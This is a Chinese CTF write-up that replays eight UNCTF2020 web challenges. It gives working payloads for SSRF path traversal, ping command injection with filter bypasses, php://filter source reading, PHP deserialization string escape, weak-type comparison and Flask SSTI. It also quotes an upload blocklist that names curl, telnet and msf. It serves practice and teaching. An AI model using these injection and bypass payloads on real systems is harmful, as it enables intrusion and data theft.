---
title: UNCTF2020复现
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-11-17 22:48:48
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1113441.jpg
---
这比赛没报上名，借的别人的号看了看觉得题挺不错的，结束以后正好官方给了复现环境，打打基础准备接下来的NCTF和HECTF。

一、easy_ssrf

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201116141753.png)

payload：url=/unctf.com/../flag

考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF
php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。

FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。https://www.runoob.com/php/filter-validate-url.html

题目中要求url中存在 unctf.com
我们可以构造类似 unctf.com/../ 这样的url，又因为我们需要查看flag文件

最终payload为 url=unctf.com/../flag

二、UN's_online_tools

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201116161548.png)

ping命令执行的绕过，就那么几样东西。
首先127.0.0.1||ls看到目录下的index.php和style.css
cat index.php显示非法字符
127.0.0.1|ca\t<index.php
成功绕过看到源码：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201116161936.png)

payload：url=127.0.0.1|ta\c%09../../../fla%3F 

三、babyeval

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201116225325.png)

过滤了括号，以及返回的内容中不能含有flag

a=include "php://filter/read=convert.base64-encode/resource=flag.php";

四、ezfind

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117121654.png)

http://2b4e0d94-c2fd-4aa6-ba2c-af5528e74031.node1.hackingfor.fun/index.php?name[]=1

随便传个数组就绕过了，不知道咋回事，应该是非预期。
等wp出来看看预期解。

五、easyunserialize

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117122155.png)

明显的反序列化+字符串逃逸
最基础的
payload：#1=challengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";i:1;}";s:8:"password";s:4:"easy";}aaa

六、ezphp

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117130234.png)

payload：data=a:2:{s:8:"username";b:1;s:8:"password";b:1;}

这个上来乍一看直接让username=admin，password=password就行。但一波操作之后发现不行。
仔细研究发现如果是username数据类型是a的话$data_unserialzie['username']的值是不存在的，这里我也不是很清楚。
去网上找了下数据类型

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117133511.png)

bool类型的true跟任意字符串可以弱类型相等，即得出上面的payload。

七、easyflask

提示要以admin登录
由于题目是flask直接找到/register和/login
注册登录居然直接成功，然后在首页看到了这个

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117205801.png)

访问提示you should 'guess' the secret number

尝试：/secret_route_you_do_not_know?guess={{7*7}}

返回49 error!!
存在ssti
拿了个库存的paylaod打算一把梭，然后发现有黑名单，单引号、下划线、方括号。
都是常见的绕过，也没什么难的，稍微改改就行。
[]可以用getitem()：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117225350.png)

__ 和 "(引号)可以用|attr绕过，例：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117225410.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117222120.png)

八、easy_upload

perl|pyth|ph|auto|curl|base|\|>|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!

可以传htaccess，由于过滤了php，换行绕过即可。


到此最基础的送分题应该是做完了，收获还是很大的，对我目前最弱的php的一些基础有了很大的提升（本地试了好多payload），同时复习了一遍各种绕过。最后感谢一下UNCTF的师傅们赛后还提供了复现环境。

